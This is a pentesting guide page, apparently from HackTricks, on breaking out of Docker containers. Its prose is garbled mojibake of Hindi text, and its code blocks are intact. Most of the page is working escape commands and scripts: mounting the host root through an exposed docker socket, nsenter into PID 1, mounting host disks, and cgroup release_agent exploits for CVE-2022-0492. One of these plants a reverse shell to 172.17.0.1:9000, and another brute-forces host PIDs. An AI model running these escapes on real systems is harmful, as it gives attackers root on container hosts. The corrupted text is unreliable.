# Docker Breakout / рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдЙрдиреНрдирддрд┐

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **рдореБрдЭреЗ** **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** рджреНрд╡рд╛рд░рд╛ **PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github рд░реЗрдкреЛ рдореЗрдВред

</details>

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдФрд░ рджреБрдирд┐рдпрд╛ рдХреЗ **рд╕рдмрд╕реЗ рдЙрдиреНрдирдд рд╕рдореБрджрд╛рдп рдЙрдкрдХрд░рдгреЛрдВ** рджреНрд╡рд╛рд░рд╛ рд╕рдВрдЪрд╛рд▓рд┐рдд **рдХрд╛рд░реНрдпрдкреНрд░рд╡рд╛рд╣реЛрдВ** рдХреЛ рдЖрд╕рд╛рдиреА рд╕реЗ рдирд┐рд░реНрдорд╛рдг рдФрд░ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдХрд░реЗрдВред\
рдЖрдЬ рд╣реА рдкрд╣реБрдВрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдЧрдгрдирд╛ рдФрд░ рднрд╛рдЧрдирд╛

* [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): рдпрд╣ **рдХрдВрдЯреЗрдирд░реЛрдВ рдХреА рдЧрдгрдирд╛** рднреА рдХрд░ рд╕рдХрддрд╛ рд╣реИ
* [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): рдпрд╣ рдЙрдкрдХрд░рдг рдЦрд╛рд╕ рд░реВрдк рд╕реЗ **рдЙрд╕ рдХрдВрдЯреЗрдирд░ рдХреА рдЧрдгрдирд╛ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдЖрдк рд╣реИрдВ рдФрд░ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рднрд╛рдЧрдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**
* [**amicontained**](https://github.com/genuinetools/amicontained): рдЗрд╕реНрддреЗрдорд╛рд▓реА рдЙрдкрдХрд░рдг рдЬрд╛рдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдХрдВрдЯреЗрдирд░ рдХреЗ рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬ рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЬрд┐рд╕рд╕реЗ рдЖрдк рдЙрд╕рд╕реЗ рднрд╛рдЧ рд╕рдХреЗрдВ
* [**deepce**](https://github.com/stealthcopter/deepce): рдХрдВрдЯреЗрдирд░реЛрдВ рдХреА рдЧрдгрдирд╛ рдФрд░ рднрд╛рдЧрдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдХрд░рдг
* [**grype**](https://github.com/anchore/grype): рдЫрд╡рд┐ рдореЗрдВ рд╕реНрдерд╛рдкрд┐рдд рд╕реЙрдлреНрдЯрд╡реЗрдпрд░ рдореЗрдВ рд╢рд╛рдорд┐рд▓ CVEs рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ

## рдорд╛рдЙрдВрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдбреЙрдХрд░ рд╕реЙрдХреЗрдЯ рднрд╛рдЧрдирд╛

рдпрджрд┐ рдХрд┐рд╕реА рдкреНрд░рдХрд╛рд░ рд╕реЗ рдЖрдкрдХреЛ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ **рдбреЙрдХрд░ рд╕реЙрдХреЗрдЯ** рдХреЛ рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ рдорд╛рдЙрдВрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдЖрдк рдЙрд╕рд╕реЗ рднрд╛рдЧ рд╕рдХреЗрдВрдЧреЗред\
рдпрд╣ рдЖрдо рддреМрд░ рдкрд░ рдЙрди рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░реЛрдВ рдореЗрдВ рд╣реЛрддрд╛ рд╣реИ рдЬреЛ рдХрд┐рд╕реА рдХрд╛рд░рдгрд╡рд╢ рдбреЙрдХрд░ рдбреЗрдорди рд╕реЗ рдХрдиреЗрдХреНрдЯ рд╣реЛрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ рдЬрд┐рд╕рд╕реЗ рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред
```bash
#Search the socket
find / -name docker.sock 2>/dev/null
#It's usually in /run/docker.sock
```
рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдЖрдк рд╕рд╛рдорд╛рдиреНрдп рдбреЙрдХрд░ рдХрдорд╛рдВрдбреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдбреЙрдХрд░ рдбреЗрдорди рдХреЗ рд╕рд╛рде рд╕рдВрдЪрд╛рд░ рдХреЗ рд▓рд┐рдП:
```bash
#List images to use one
docker images
#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash

# Get full access to the host via ns pid and nsenter cli
docker run -it --rm --pid=host --privileged ubuntu bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Get full privs in container without --privileged
docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
```
{% hint style="info" %}
рдпрджрд┐ **рдбреЙрдХрд░ рд╕реЙрдХреЗрдЯ рдЕрдкреНрд░рддреНрдпрд╛рд╢рд┐рдд рд╕реНрдерд╛рди рдкрд░ рд╣реИ** рддреЛ рдЖрдк рдЗрд╕рдХреЗ рд╕рд╛рде рдЕрднреА рднреА рд╕рдВрдЪрд╛рд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ **`docker`** рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рд╕рд╛рде **`-H unix:///path/to/docker.sock`**
{% endhint %}

рдбреЙрдХрд░ рдбреЗрдорди рднреА [рдПрдХ рдкреЛрд░реНрдЯ рдореЗрдВ рд╕реБрди рд░рд╣рд╛ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ (рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ 2375, 2376)](../../../../network-services-pentesting/2375-pentesting-docker.md) рдпрд╛ Systemd-рдЖрдзрд╛рд░рд┐рдд рд╕рд┐рд╕реНрдЯрдореЛрдВ рдкрд░, рдбреЙрдХрд░ рдбреЗрдорди рдХреЗ рд╕рд╛рде рд╕рдВрдЪрд╛рд░ Systemd рд╕реЙрдХреЗрдЯ `fd://` рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

{% hint style="info" %}
рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рдЕрдиреНрдп рдЙрдЪреНрдЪ рд╕реНрддрд░реАрдп рд░рдирдЯрд╛рдЗрдо рдХреЗ рд╕реЙрдХреЗрдЯ рдХреА рд░рдирдЯрд╛рдЗрдо рд╕реЙрдХреЗрдЯ рдкрд░ рдзреНрдпрд╛рди рджреЗрдВ:

* dockershim: `unix:///var/run/dockershim.sock`
* containerd: `unix:///run/containerd/containerd.sock`
* cri-o: `unix:///var/run/crio/crio.sock`
* frakti: `unix:///var/run/frakti.sock`
* rktlet: `unix:///var/run/rktlet.sock`
* ...
{% endhint %}

## Capabilities рджреБрд░реБрдкрдпреЛрдЧ рднрд╛рдЧрдирд╛

рдЖрдкрдХреЛ рдХрдВрдЯреЗрдирд░ рдХреА рдХреНрд╖рдорддрд╛рдУрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреА рдЪрд╛рд╣рд┐рдП, рдпрджрд┐ рдЗрд╕рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдореЗрдВ рд╕реЗ рдХреЛрдИ рд╣реИ, рддреЛ рдЖрдк рдЗрд╕рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓ рд╕рдХрддреЗ рд╣реИрдВ: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**

рдЖрдк рд╡рд░реНрддрдорд╛рди рдореЗрдВ рдХрдВрдЯреЗрдирд░ рдХреА рдХреНрд╖рдорддрд╛рдПрдБ рдЬрд╛рдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ **рдкрд╣рд▓реЗ рд╕реЗ рдЙрд▓реНрд▓рд┐рдЦрд┐рдд рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдЙрдкрдХрд░рдгреЛрдВ** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдпрд╛:
```bash
capsh --print
```
## рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░рд┐рдд рдХрдВрдЯреЗрдирд░ рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓реЗрдВ

рдПрдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░рд┐рдд рдХрдВрдЯреЗрдирд░ рдХреЛ рдЭрдВрдЭрдЯ `--privileged` рдХреЗ рдлреНрд▓реИрдЧ рдпрд╛ рд╡рд┐рд╢реЗрд╖ рд░рдХреНрд╖рд╛рдУрдВ рдХреЛ рдЕрдХреНрд╖рдо рдХрд░рдХреЗ рдмрдирд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:

* `--cap-add=ALL`
* `--security-opt apparmor=unconfined`
* `--security-opt seccomp=unconfined`
* `--security-opt label:disable`
* `--pid=host`
* `--userns=host`
* `--uts=host`
* `--cgroupns=host`
* `/dev` рдорд╛рдЙрдВрдЯ рдХрд░реЗрдВ

`--privileged` рдлреНрд▓реИрдЧ рдХрдВрдЯреЗрдирд░ рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдХрд╛рдлреА рдХрдо рдХрд░ рджреЗрддрд╛ рд╣реИ, **рдЕрд╕реАрдорд┐рдд рдЙрдкрдХрд░рдг рдПрдХреНрд╕реЗрд╕** рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдФрд░ **рдХрдИ рд╕реБрд░рдХреНрд╖рд╛ рдЙрдкрд╛рдпреЛрдВ** рдХреЛ рдЫрд▓рдиреЗ рджреЗрддрд╛ рд╣реИред рд╡рд┐рд╕реНрддреГрдд рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХреЗ рд▓рд┐рдП, `--privileged` рдХреЗ рдкреВрд░реЗ рдкреНрд░рднрд╛рд╡ рдкрд░ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХрд░рдг рджреЗрдЦреЗрдВред

{% content-ref url="../docker-privileged.md" %}
[docker-privileged.md](../docker-privileged.md)
{% endcontent-ref %}

### рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░рд┐рдд + hostPID

рдЗрди рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рдЖрдк **рдореБрдЦреНрдп рдореЗрдВ рд░реВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓ рд░рд╣реЗ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рдиреЗрдорд╕реНрдкреЗрд╕ рдореЗрдВ рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ** рдЬреИрд╕реЗ init (pid:1) рдмрд╕ рдпрд╣ рд░рди рдХрд░рдХреЗ: `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`

рдЗрд╕реЗ рдПрдХ рдХрдВрдЯреЗрдирд░ рдореЗрдВ рдЯреЗрд╕реНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВ:
```bash
docker run --rm -it --pid=host --privileged ubuntu bash
```
### рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░

рдХреЗрд╡рд▓ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдзреНрд╡рдЬ рдХреЗ рд╕рд╛рде рдЖрдк **рд╣реЛрд╕реНрдЯ рдХреА рдбрд┐рд╕реНрдХ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ** рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ **release\_agent рдпрд╛ рдЕрдиреНрдп рднрд╛рдЧреЛрдВ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдмрдЪрдиреЗ** рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрдорд╛рд░реЛрдВ рдХрд╛ рдкрд░реАрдХреНрд╖рдг рдХрд░реЗрдВ рдЬреЛ рдПрдХ рдХрдВрдЯреЗрдирд░ рдореЗрдВ рдХрд╛рд░реНрдпрд╛рдиреНрд╡рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```bash
docker run --rm -it --privileged ubuntu bash
```
#### рдбрд┐рд╕реНрдХ рдорд╛рдЙрдВрдЯ рдХрд░рдирд╛ - Poc1

рдЕрдЪреНрдЫреА рддрд░рд╣ рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░реНрд╕ **fdisk -l** рдЬреИрд╕реЗ рдХрдорд╛рдВрдб рдХреЛ рдирд╣реАрдВ рдЕрдиреБрдорддрд┐ рджреЗрдВрдЧреЗред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЬрдм `--privileged` рдпрд╛ `--device=/dev/sda1` рдлреНрд▓реИрдЧ рдХреЗ рд╕рд╛рде рдХреИрдкреНрд╕ рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдореЗрдЬрд╝рдмрд╛рди рдбреНрд░рд╛рдЗрд╡ рджреЗрдЦрдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИред

![](https://bestestredteam.com/content/images/2019/08/image-16.png)

рдЗрд╕рд▓рд┐рдП рдореЗрдЬрд╝рдмрд╛рди рдорд╢реАрди рдкрд░ рдХрдмреНрдЬрд╝рд╛ рдХрд░рдирд╛ рдмрд╣реБрдд рдЖрд╕рд╛рди рд╣реИ:
```bash
mkdir -p /mnt/hola
mount /dev/sda1 /mnt/hola
```
рдФрд░ рджреЗрдЦреЛ! рдЕрдм рдЖрдк рдореЗрдЬрд╝рдмрд╛рди рдХреЗ рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддреЗ рд╣реИрдВ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ `/mnt/hola` рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рдорд╛рдЙрдВрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред

#### рдбрд┐рд╕реНрдХ рдорд╛рдЙрдВрдЯ рдХрд░рдирд╛ - Poc2

рдХрдВрдЯреЗрдирд░ рдХреЗ рднреАрддрд░, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдореЗрдЬрд╝рдмрд╛рди рдУрдПрд╕ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рд╕реЗ рдХреНрд▓рд╕реНрдЯрд░ рджреНрд╡рд╛рд░рд╛ рдмрдирд╛рдП рдЧрдП рдПрдХ рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп рд╣реЛрд╕реНрдЯрдкреИрде рд╡реЙрд▓реНрдпреВрдо рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рдиреАрдЪреЗ рдХреБрдЫ рд╕рд╛рдорд╛рдиреНрдп рдЪреАрдЬреЗрдВ рд╣реИрдВ рдЬреЛ рдЖрдк рдХрдВрдЯреЗрдирд░ рдХреЗ рднреАрддрд░ рдЬрд╛рдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдЖрдк рдЗрд╕ рд╣рдорд▓рд╛рд╡рд░ рд╡реЗрдХреНрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХреЗрдВ:
```bash
### Check if You Can Write to a File-system
echo 1 > /proc/sysrq-trigger

### Check root UUID
cat /proc/cmdline
BOOT_IMAGE=/boot/vmlinuz-4.4.0-197-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300

# Check Underlying Host Filesystem
findfs UUID=<UUID Value>
/dev/sda1

# Attempt to Mount the Host's Filesystem
mkdir /mnt-test
mount /dev/sda1 /mnt-test
mount: /mnt: permission denied. ---> Failed! but if not, you may have access to the underlying host OS file-system now.

### debugfs (Interactive File System Debugger)
debugfs /dev/sda1
```
#### рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рднрд╛рдЧ рдЕрд╕реНрддрд┐рддреНрд╡ рдореЗрдВ release\_agent рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1

{% code title="рдореВрд▓ PoC" %}
```bash
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash

# Finds + enables a cgroup release_agent
# Looks for something like: /sys/fs/cgroup/*/release_agent
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
# If "d" is empty, this won't work, you need to use the next PoC

# Enables notify_on_release in the cgroup
mkdir -p $d/w;
echo 1 >$d/w/notify_on_release
# If you have a "Read-only file system" error, you need to use the next PoC

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
t=`sed -n 's/overlay \/ .*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
touch /o; echo $t/c > $d/release_agent

# Creates a payload
echo "#!/bin/sh" > /c
echo "ps > $t/o" >> /c
chmod +x /c

# Triggers the cgroup via empty cgroup.procs
sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1

# Reads the output
cat /o
```
{% endcode %}

#### рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рднрд╛рдЧрдирд╛ рдмрдирд╛рдП рдЧрдП release_agent рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2

{% code title="рджреВрд╕рд░рд╛ PoC" %}
```bash
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# Mounts the RDMA cgroup controller and create a child cgroup
# This technique should work with the majority of cgroup controllers
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the RDMA cgroup controller, try change rdma to memory to fix it
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
# If mount gives an error, this won't work, you need to use the first PoC

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/172.17.0.1/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
# By creating a /bin/sh process and writing its PID to the cgroup.procs file in "x" child cgroup directory
# The script on the host will execute after /bin/sh exits
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
{% endcode %}

**рддрдХрдиреАрдХ рдХреА рд╡реНрдпрд╛рдЦреНрдпрд╛** рдЦреЛрдЬреЗрдВ:

{% content-ref url="docker-release_agent-cgroups-escape.md" %}
[docker-release\_agent-cgroups-escape.md](docker-release\_agent-cgroups-escape.md)
{% endcontent-ref %}

#### рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рднрд╛рдЧрдирд╛ - relative path рдкрддрд╛ рдирд╣реАрдВ рд╣реИ release\_agent рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ - PoC3

рдкрд┐рдЫрд▓реЗ рдЙрддреНрдкреАрдбрд╝рдиреЛрдВ рдореЗрдВ **рдореЗрдЬрд╝рдмрд╛рди рдлрд╝рд╛рдЗрд▓рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рдХрдВрдЯреЗрдирд░ рдХрд╛ рдкреВрд░реНрдг рдкрде рдЙрдЬрд╛рдЧрд░ рд╣реЛрддрд╛ рд╣реИ**ред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрд╣ рд╣рдореЗрд╢рд╛ рдРрд╕рд╛ рдирд╣реАрдВ рд╣реЛрддрд╛ред рдЙрди рдорд╛рдорд▓реЛрдВ рдореЗрдВ рдЬрд╣рд╛рдВ рдЖрдк **рдореЗрдЬрд╝рдмрд╛рди рдореЗрдВ рдХрдВрдЯреЗрдирд░ рдХрд╛ рдкреВрд░реНрдг рдкрде рдирд╣реАрдВ рдЬрд╛рдирддреЗ** рд╣реИрдВ, рдЖрдк рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="release_agent-exploit-relative-paths-to-pids.md" %}
[release\_agent-exploit-relative-paths-to-pids.md](release\_agent-exploit-relative-paths-to-pids.md)
{% endcontent-ref %}
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
рдХрд┐рд╕реА рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡рд╛рд▓реЗ рдХрдВрдЯреЗрдирд░ рдХреЗ рднреАрддрд░ PoC рдХреЛ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рдХрд░рдиреЗ рд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЗ рд╕рдорд╛рди рдЖрдЙрдЯрдкреБрдЯ рдкреНрд░рд╛рдкреНрдд рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП:
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
